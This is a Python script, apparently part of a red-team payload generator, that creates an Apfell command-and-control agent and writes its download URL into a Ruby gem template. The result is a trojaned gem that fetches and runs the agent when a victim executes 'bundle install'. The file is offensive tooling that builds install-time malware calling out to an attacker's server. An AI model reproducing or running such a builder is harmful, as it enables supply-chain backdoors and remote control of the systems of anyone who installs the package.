import os
import asyncio
from .Utilities import *

def ruby_gem():
    temp = "./Templates/Ruby_Gem/"
    payload = "./Payloads/Ruby_Gem_Payload/"

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="Ruby Gem",
                                                     filename="Ruby_Gek.js",
                                                     include_all_commands=True)

        # Replace template values
        templateString = "URL"
        modifyFile = payload + "/lib/gem/loader/version.rb"
        url = await get_payload_download_url(payload_info)

        fin = open(modifyFile, "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()

        fin = open(modifyFile, "wt")
        fin.write(data)
        fin.close()

        #  Build the payload (currently no payload)
        print("[*] Building Ruby Gem")
        os.system("chmod +x " + modifyFile)
        print("[*] Done! Execute using Ruby 'bundle install' within folder")

    async def main():
        await scripting()

    asyncio.run(main())
